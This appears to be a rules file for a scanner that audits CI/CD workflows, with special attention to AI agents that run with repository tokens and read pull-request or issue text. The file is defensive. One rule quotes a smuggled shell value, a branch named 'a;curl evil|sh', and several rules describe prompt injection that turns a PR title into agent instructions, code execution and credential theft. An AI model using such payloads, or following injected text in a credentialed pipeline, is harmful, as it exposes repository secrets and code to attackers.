purpose: Audit CI/CD workflows, with special attention to pipelines where an AI agent runs with repository credentials and reads attacker-controlled text.
threat: In an agentic pipeline the untrusted input is not only a shell argument - it is the agent's instructions. A PR title becomes a prompt. If that pipeline holds a write token or a secret, prompt injection becomes code execution and credential theft.
reject_these_excuses: 'Only maintainers open PRs' - a fork PR, an issue comment or a review comment is enough for most of these triggers.
'The tool allowlist restricts it' - a wildcard, or any single shell-capable tool, defeats the allowlist.
'There is no ${{ }} in the prompt' - the agent still reads the issue body through its own API calls.
'It runs in a sandbox' - the sandbox still holds the token, and the token is the target.
'It needs a secret to be exploitable' - GITHUB_TOKEN is a secret, and it is always there.

categories.AGENT: AI agent in CI reading untrusted input

rules.title: pull_request_target trigger
rules.note: Runs with the base repository's secrets and token, but the PR is authored by anyone. Every untrusted value in this file is now a credentialed-context input.
rules.fp: Safe only if the job never checks out PR code and never interpolates PR-controlled text. Prove both.
rules.fix: Split into an untrusted build job (pull_request, no secrets) and a trusted job triggered by workflow_run that only consumes artifacts.

rules.title: Comment or issue trigger
rules.note: Anyone who can comment can start this workflow and control its input text.
rules.fp: An author-association guard limited to OWNER/MEMBER genuinely reduces this. Find the guard or report it missing.
rules.fix: Gate on `github.event.comment.author_association` and require an explicit command prefix.

rules.title: Write permissions granted
rules.note: Defines the blast radius. `contents: write` plus any injection equals arbitrary commits. `id-token: write` reaches your cloud account.
rules.fp: A release workflow triggered only by a tag push needs write and takes no untrusted input.
rules.fix: Set `permissions: contents: read` at workflow level and widen per job only where required.

rules.title: Untrusted expression interpolated into a script
rules.note: Expressions are substituted before the shell parses the line, so a branch named `a;curl evil|sh` is a command. Classic and still everywhere.
rules.fp: Interpolation into an `env:` block that is then referenced as "$VAR" with quotes is the correct fix pattern, not a finding.
rules.fix: Pass through env: `env: TITLE: ${{ github.event.issue.title }}` then use "$TITLE" quoted in the script.

rules.title: Untrusted value reaches a shell through an env var without quoting
rules.note: The env-var indirection only works if the expansion is quoted. Unquoted, word splitting and globbing return.
rules.fp: Inside a single-quoted heredoc or a non-shell step this does not expand.

rules.title: Command substitution over environment or event data
rules.note: Evaluates untrusted text in a subshell, and often dumps the whole environment - which is where the secrets are.
rules.fp: None worth defending in a credentialed workflow.
rules.fix: Read the value with the API into a file and parse the file; never through a subshell.

rules.title: AI agent invoked in CI
rules.note: Establishes that an agent runs here. Now answer three questions: what untrusted text can it read, what tools can it call, and what credentials does the job hold?
rules.fp: An agent job triggered only by manual workflow_dispatch from a maintainer with read-only permissions.
rules.fix: Give the agent job read-only permissions, no long-lived secrets, and an explicit non-wildcard tool allowlist.

rules.title: Untrusted text placed directly in an agent prompt
rules.note: The attacker is writing the agent's instructions. There is no escaping that fixes this - prompts have no quoting layer.
rules.fp: None. Even a 'summarise this' prompt is exploitable once the agent has a token.
rules.fix: Have the agent fetch the text itself into a file, label it as untrusted data in the prompt, and drop write permissions.

rules.title: Agent granted unrestricted tools
rules.note: A wildcard or a shell tool means the injection has a shell. The allowlist is the only thing between the prompt and the token.
rules.fp: None. Name the exact tools the job needs instead.
rules.fix: Enumerate tools explicitly, e.g. `Read,Grep,Glob`. Never grant Bash in a job that reads untrusted text.

rules.title: Agent output executed or evaluated
rules.note: Model output is untrusted output (Law 1). Piping it to a shell turns a suggestion into execution.
rules.fix: Write agent output to an artifact and require a human to review it before anything runs.

rules.title: Agent job holds a long-lived secret
rules.note: Anything in the job environment is reachable by anything the agent runs. Inventory every secret in an agent job.
rules.fp: A publish job with no agent and no untrusted input.
rules.fix: Move privileged steps into a separate job with no agent and no untrusted input; use OIDC short-lived credentials.

rules.title: Checkout of PR head in a credentialed workflow
rules.note: Only a finding when paired with pull_request_target or a comment trigger - then attacker code runs with your secrets. Check the trigger first.
rules.fp: With a plain `pull_request` trigger this is the normal, safe pattern.
rules.fix: Never combine PR-head checkout with pull_request_target. Use the two-job artifact handoff.

rules.title: Build or install step runs untrusted code
rules.note: Lifecycle scripts, Makefiles and build plugins are code from the checked-out tree. In a credentialed job that is arbitrary execution.
rules.fp: Fine in an uncredentialed pull_request job. Judge it together with the trigger and permissions.
rules.fix: Use `npm ci --ignore-scripts` in credentialed jobs and move the build to the untrusted job.

rules.title: Whole secret context or environment exposed
rules.note: Dumps every secret into the log or the network. Masking is best-effort and base64 defeats it.
rules.fix: Reference secrets individually, only in the step that needs them.

rules.title: Secret passed on a command line
rules.note: Command lines are visible to other processes and are often echoed by set -x.
rules.fp: Some tools have no env-var alternative. Say so explicitly if that is the case.
rules.fix: Pass secrets via env: or stdin instead of argv.

rules.title: Secret written into an output or artifact
rules.note: Step outputs and artifacts outlive the step and are readable by later jobs and often by forks.
rules.fix: Keep secrets in the process environment; never persist them.

rules.title: Third-party action pinned to a mutable ref
rules.note: A tag can be moved. Whoever owns that repository can change what runs in your credentialed job at any time.
rules.fp: First-party actions/* are excluded by convention; a vendored local action with ./ is fine.
rules.fix: Pin to a full 40-character commit SHA with the version in a trailing comment.

rules.title: Remote script downloaded and executed
rules.note: Unreviewed, unpinned remote code with the job's full credentials.
rules.fp: None. Even official installers should be pinned and checksummed.
rules.fix: Vendor the installer, pin a version, and verify a checksum before running it.

rules.title: Self-hosted runner
rules.note: State persists between jobs and the machine sits inside your network. Combined with untrusted code this is lateral movement.
rules.fp: Ephemeral, single-use runners in an isolated network materially reduce this.
rules.fix: Use ephemeral runners and never expose them to fork PRs.
